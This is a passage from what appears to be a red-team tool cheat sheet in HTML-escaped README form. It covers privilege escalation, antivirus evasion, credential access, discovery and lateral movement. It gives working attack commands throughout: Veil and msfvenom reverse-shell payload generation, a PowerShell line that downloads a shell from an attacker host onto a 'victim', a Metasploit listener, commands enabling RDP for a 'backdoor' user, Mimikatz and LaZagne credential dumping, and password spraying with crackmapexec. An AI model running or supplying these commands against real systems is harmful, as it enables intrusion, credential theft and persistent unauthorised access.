SYSVOL folder on the domain controller for any GPP files that contain password information. Once it finds these files, it decrypts the password information and displays it to the user.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Follow the PowerSploit &lt;a href=&#34;https://github.com/A-poc/RedTeam-Tools#powersploit&#34;&gt;installation instructions&lt;/a&gt; from this tool sheet.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;powershell.exe -ep bypass&#xA;Import-Module PowerSploit&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Get all passwords with additional information&#xA;Get-GPPPassword&#xA;&#xA;# Get list of all passwords&#xA;Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210089230-6a61579b-849d-4175-96ec-6ea75e001038.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/rasta-mouse/Sherlock&#34;&gt;Sherlock&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Supports:&lt;/em&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;MS10-015 : User Mode to Ring (KiTrap0D)&lt;/li&gt; &#xA; &lt;li&gt;MS10-092 : Task Scheduler&lt;/li&gt; &#xA; &lt;li&gt;MS13-053 : NTUserMessageCall Win32k Kernel Pool Overflow&lt;/li&gt; &#xA; &lt;li&gt;MS13-081 : TrackPopupMenuEx Win32k NULL Page&lt;/li&gt; &#xA; &lt;li&gt;MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference&lt;/li&gt; &#xA; &lt;li&gt;MS15-051 : ClientCopyImage Win32k&lt;/li&gt; &#xA; &lt;li&gt;MS15-078 : Font Driver Buffer Overflow&lt;/li&gt; &#xA; &lt;li&gt;MS16-016 : &#39;mrxdav.sys&#39; WebDAV&lt;/li&gt; &#xA; &lt;li&gt;MS16-032 : Secondary Logon Handle&lt;/li&gt; &#xA; &lt;li&gt;MS16-034 : Windows Kernel-Mode Drivers EoP&lt;/li&gt; &#xA; &lt;li&gt;MS16-135 : Win32k Elevation of Privilege&lt;/li&gt; &#xA; &lt;li&gt;CVE-2017-7199 : Nessus Agent 6.6.2 - 6.10.3 Priv Esc&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (PowerShell)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Git install&#xA;git clone https://github.com/rasta-mouse/Sherlock&#xA;&#xA;# Load powershell module&#xA;Import-Module -Name C:\INSTALL_LOCATION\Sherlock\Sherlock.ps1&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage: (PowerShell)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Run all functions&#xA;Find-AllVulns&#xA;&#xA;# Run specific function (MS14-058 : TrackPopupMenu Win32k Null Pointer Dereference)&#xA;Find-MS14058&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210182250-b5e9a4c1-4d30-4591-b06b-7d58098c7fef.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Image used from &lt;a href=&#34;https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/&#34;&gt;https://vk9-sec.com/sherlock-find-missing-windows-patches-for-local-privilege-escalation/&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/rasta-mouse/Watson&#34;&gt;Watson&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Watson is a .NET tool designed to enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities.&lt;/p&gt; &#xA;&lt;p&gt;Great for identifying missing patches and suggesting exploits that could be used to exploit known vulnerabilities in order to gain higher privileges on the system.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Using &lt;a href=&#34;https://visualstudio.microsoft.com/vs/community/&#34;&gt;Visual Studio 2019 Community Edition&lt;/a&gt;. Open the &lt;a href=&#34;https://github.com/rasta-mouse/Watson&#34;&gt;Watson project .sln&lt;/a&gt;, choose &#34;Release&#34;, and build.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Run all checks&#xA;Watson.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210182370-409be1ac-64f9-4a07-96bd-b0752d7609a2.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Image text used from &lt;a href=&#34;https://github.com/rasta-mouse/Watson#usage&#34;&gt;https://github.com/rasta-mouse/Watson#usage&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Defense Evasion&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/danielbohannon/Invoke-Obfuscation&#34;&gt;Invoke-Obfuscation&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;A PowerShell v2.0+ compatible PowerShell command and script obfuscator. If a victim endpoint is able to execute PowerShell then this tool is great for creating heavily obfuscated scripts.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/danielbohannon/Invoke-Obfuscation.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;./Invoke-Obfuscation&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/206557377-a522ab7a-5803-48b0-8f3e-d7d7b607e692.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/Veil-Framework/Veil&#34;&gt;Veil&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Veil is a tool for generating metasploit payloads that bypass common anti-virus solutions.&lt;/p&gt; &#xA;&lt;p&gt;It can be used to generate obfuscated shellcode, see the official &lt;a href=&#34;https://www.veil-framework.com/&#34;&gt;veil framework blog&lt;/a&gt; for more info.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Kali)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;apt -y install veil&#xA;/usr/share/veil/config/setup.sh --force --silent&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Git)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt-get -y install git&#xA;git clone https://github.com/Veil-Framework/Veil.git&#xA;cd Veil/&#xA;./config/setup.sh --force --silent&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# List all payloads (â€“list-payloads) for the tool Ordnance (-t Ordnance)&#xA;./Veil.py -t Ordnance --list-payloads&#xA;&#xA;# List all encoders (â€“list-encoders) for the tool Ordnance (-t Ordnance)&#xA;./Veil.py -t Ordnance --list-encoders&#xA;&#xA;# Generate a reverse tcp payload which connects back to the ip 192.168.1.20 on port 1234&#xA;./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 192.168.1.20 --port 1234&#xA;&#xA;# List all payloads (â€“list-payloads) for the tool Evasion (-t Evasion)&#xA;./Veil.py -t Evasion --list-payloads&#xA;&#xA;# Generate shellcode using Evasion, payload number 41, reverse_tcp to 192.168.1.4 on port 8676, output file chris&#xA;./Veil.py -t Evasion -p 41 --msfvenom windows/meterpreter/reverse_tcp --ip 192.168.1.4 --port 8676 -o chris&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Veil creators wrote a nice &lt;a href=&#34;https://www.veil-framework.com/veil-command-line-usage/&#34;&gt;blog post&lt;/a&gt; explaining further ordnance and evasion command line usage.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210136422-6b17671f-8868-4747-a7fe-e75d36b99e61.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Credential Access&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/gentilkiwi/mimikatz&#34;&gt;Mimikatz&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Great tool for gaining access to hashed and cleartext passwords on a victims endpoint. Once you have gained privileged access to a system, drop this tool to collect some creds.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Download the &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/releases&#34;&gt;mimikatz_trunk.7z&lt;/a&gt; file.&lt;/li&gt; &#xA; &lt;li&gt;Once downloaded, the &lt;code&gt;mimikatz.exe&lt;/code&gt; binary is in the &lt;code&gt;x64&lt;/code&gt; folder.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;.\mimikatz.exe&#xA;privilege::debug&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208253562-5c58d412-ed3e-4ab5-b8e7-11092852c3d0.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/AlessandroZ/LaZagne&#34;&gt;LaZagne&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Nice tool for extracting locally stored passwords from browsers, databases, games, mail, git, wifi, etc.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Binary)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can install the standalone binary from &lt;a href=&#34;https://github.com/AlessandroZ/LaZagne/releases/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Launch all modes&#xA;.\laZagne.exe all&#xA;&#xA;# Launch only a specific module&#xA;.\laZagne.exe browsers&#xA;&#xA;# Launch only a specific software script&#xA;.\laZagne.exe browsers -firefox&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208253800-48f960db-d569-4d1a-b39f-d6c7643691e2.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/hashcat/hashcat&#34;&gt;hashcat&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Tool for cracking password hashes. Supports a large list of hashing algorithms (Full list can be found &lt;a href=&#34;https://hashcat.net/wiki/doku.php?id=example_hashes&#34;&gt;here&lt;/a&gt;).&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: Binary&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can install the standalone binary from &lt;a href=&#34;https://hashcat.net/hashcat/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;.\hashcat.exe --help&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Nice hashcat command &lt;a href=&#34;https://cheatsheet.haax.fr/passcracking-hashfiles/hashcat_cheatsheet/&#34;&gt;cheatsheet&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208263419-94bf92c0-1c83-4366-a6c2-b6533fdcc521.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/openwall/john&#34;&gt;John the Ripper&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Another password cracker, which supports hundreds of hash and cipher types, and runs on many operating systems, CPUs and GPUs.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt-get install john -y&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;john&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/208263690-8c2d1253-7261-47da-850d-ca5a8d98ca13.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Discovery&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/lgandx/PCredz&#34;&gt;PCredz&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;This tool extracts Credit card numbers, NTLM(DCE-RPC, HTTP, SQL, LDAP, etc), Kerberos (AS-REQ Pre-Auth etype 23), HTTP Basic, SNMP, POP, SMTP, FTP, IMAP, etc from a pcap file or from a live interface.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/lgandx/PCredz&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt; (PCAP File Folder)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;python3 ./Pcredz -d /tmp/pcap-directory-to-parse/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt; (Live Capture)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;python3 ./Pcredz -i eth0 -v&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/191007004-a0fd01f3-e01f-4bdb-b89e-887c85a7be91.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/vletoux/pingcastle&#34;&gt;PingCastle&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Ping Castle is a tool designed to assess quickly the Active Directory security level with a methodology based on risk assessment and a maturity framework. It does not aim at a perfect evaluation but rather as an efficiency compromise.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt; (Download)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11.0.1.zip&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;./PingCastle.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/191008405-39bab2dc-54ce-43d1-aed7-53956776a9ef.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/GhostPack/Seatbelt&#34;&gt;Seatbelt&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Seatbelt is a useful tool for gathering detailed information about the security posture of a target Windows machine in order to identify potential vulnerabilities and attack vectors.&lt;/p&gt; &#xA;&lt;p&gt;It is designed to be run on a compromised victim machine to gather information about the current security configuration, including information about installed software, services, group policies, and other security-related settings&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Compile)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Seatbelt has been built against .NET 3.5 and 4.0 with C# 8.0 features and is compatible with &lt;a href=&#34;https://visualstudio.microsoft.com/downloads/&#34;&gt;Visual Studio Community Edition&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Open up the project .sln, choose &#34;release&#34;, and build.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# Run all checks and output to output.txt&#xA;Seatbelt.exe -group=all -full &amp;gt; output.txt&#xA;&#xA;# Return 4624 logon events for the last 30 days&#xA;Seatbelt.exe &#34;LogonEvents 30&#34;&#xA;&#xA;# Query the registry three levels deep, returning only keys/valueNames/values that match the regex .*defini.*&#xA;Seatbelt.exe &#34;reg \&#34;HKLM\SOFTWARE\Microsoft\Windows Defender\&#34; 3 .*defini.* true&#34;&#xA;&#xA;# Run remote-focused checks against a remote system&#xA;Seatbelt.exe -group=remote -computername=192.168.230.209 -username=THESHIRE\sam -password=&#34;yum \&#34;po-ta-toes\&#34;&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Full command groups and parameters can be found &lt;a href=&#34;https://github.com/GhostPack/Seatbelt#command-groups&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210137456-14eb3329-f29d-4ce1-a595-3466bd5a962f.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Image used from &lt;a href=&#34;https://exord66.github.io/csharp-in-memory-assemblies&#34;&gt;https://exord66.github.io/csharp-in-memory-assemblies&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/sense-of-security/adrecon&#34;&gt;ADRecon&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Great tool for gathering information about a victim&#39;s Microsoft Active Directory (AD) environment, with support for Excel outputs.&lt;/p&gt; &#xA;&lt;p&gt;It can be run from any workstation that is connected to the environment, even hosts that are not domain members.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://speakerdeck.com/prashant3535/adrecon-bh-usa-2018-arsenal-and-def-con-26-demo-labs-presentation&#34;&gt;BlackHat USA 2018 SlideDeck&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Prerequisites&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;.NET Framework 3.0 or later (Windows 7 includes 3.0)&lt;/li&gt; &#xA; &lt;li&gt;PowerShell 2.0 or later (Windows 7 includes 2.0)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Git)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;git clone https://github.com/sense-of-security/ADRecon.git&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install: (Download)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;You can download a zip archive of the &lt;a href=&#34;https://github.com/sense-of-security/ADRecon/archive/master.zip&#34;&gt;latest release&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# To run ADRecon on a domain member host.&#xA;PS C:\&amp;gt; .\ADRecon.ps1&#xA;&#xA;# To run ADRecon on a domain member host as a different user.&#xA;PS C:\&amp;gt;.\ADRecon.ps1 -DomainController &amp;lt;IP or FQDN&amp;gt; -Credential &amp;lt;domain\username&amp;gt;&#xA;&#xA;# To run ADRecon on a non-member host using LDAP.&#xA;PS C:\&amp;gt;.\ADRecon.ps1 -Protocol LDAP -DomainController &amp;lt;IP or FQDN&amp;gt; -Credential &amp;lt;domain\username&amp;gt;&#xA;&#xA;# To run ADRecon with specific modules on a non-member host with RSAT. (Default OutputType is STDOUT with -Collect parameter)&#xA;PS C:\&amp;gt;.\ADRecon.ps1 -Protocol ADWS -DomainController &amp;lt;IP or FQDN&amp;gt; -Credential &amp;lt;domain\username&amp;gt; -Collect Domain, DomainControllers&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Full usage and parameter information can be found &lt;a href=&#34;https://github.com/sense-of-security/adrecon#usage&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/210137064-2a0247b3-5d28-409a-904b-0fd9db87ef56.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;Image used from &lt;a href=&#34;https://vk9-sec.com/domain-enumeration-powerview-adrecon/&#34;&gt;https://vk9-sec.com/domain-enumeration-powerview-adrecon/&lt;/a&gt;&lt;/em&gt;&lt;/p&gt; &#xA;&lt;h1&gt;Lateral Movement&lt;/h1&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;&lt;a href=&#34;https://github.com/Porchetta-Industries/CrackMapExec&#34;&gt;crackmapexec&lt;/a&gt;&lt;/h3&gt; &#xA;&lt;p&gt;This is a great tool for pivoting in a Windows/Active Directory environment using credential pairs (username:password, username:hash). It also offered other features including enumerating logged on users and spidering SMB shares to executing psexec style attacks, auto-injecting Mimikatz/Shellcode/DLLâ€™s into memory using Powershell, dumping the NTDS.dit and more.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;sudo apt install crackmapexec&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Usage:&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;crackmapexec smb &amp;lt;ip address&amp;gt; -d &amp;lt;domain&amp;gt; -u &amp;lt;user list&amp;gt; -p &amp;lt;password list&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/192070626-4549ec06-e2c5-477b-a97d-0f29e48bbfbc.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;Enabling RDP&lt;/h3&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;reg add &#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f&#xA;netsh advfirewall firewall set rule group=&#34;remote desktop&#34; new enable=Yes&#xA;net localgroup &#34;Remote Desktop Users&#34; &#34;backdoor&#34; /add&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;Upgrading shell to meterpreter&lt;/h3&gt; &#xA;&lt;p&gt;Shells (&lt;a href=&#34;https://infinitelogins.com/tag/payloads/&#34;&gt;https://infinitelogins.com/tag/payloads/&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;p&gt;After getting basic shell access to an endpoint a meterpreter is nicer to continue with.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;[attacker]&lt;/strong&gt; Generate a meterpreter shell:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe&#xA;msfvenom -p linux/x86/shell/reverse_tcp LHOST=&amp;lt;IP&amp;gt; LPORT=&amp;lt;PORT&amp;gt; -f elf &amp;gt; shell-x86.elf&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/193451669-ff745cf6-e103-4f7e-a266-f7f224dfbb0a.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;[victim]&lt;/strong&gt; Download to victim endpoint:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;powershell &#34;(New-Object System.Net.WebClient).Downloadfile(&#39;http://&amp;lt;ip&amp;gt;:8000/shell-name.exe&#39;,&#39;shell-name.exe&#39;)&#34;`&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;[attacker]&lt;/strong&gt; Configure listener:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;use exploit/multi/handler &#xA;set PAYLOAD windows/meterpreter/reverse_tcp &#xA;set LHOST your-ip &#xA;set LPORT listening-port run`&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;[victim]&lt;/strong&gt; Execute payload:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;Start-Process &#34;shell-name.exe&#34;`&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/100603074/193452305-91b769a7-96c4-43d3-b3e2-6e31b3afec27.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;&lt;a href=&#34;https://raw.githubusercontent.com/A-poc/RedTeam-Tools/main/#tool-list&#34;&gt;ðŸ”™&lt;/a&gt;Forwarding Ports&lt;/h3&gt; &#xA;&lt;p&gt;Sometimes, after gaining access to an endpoint there are local ports. Making these internal ports external routable can help for lateral movement to other services on the host.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &amp;amp;&#xA;socat TCP-LISTEN:EXTERNAL_PORT,fork TCP:127.0.0.1:INTERNAL_PORT &amp;amp;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;a 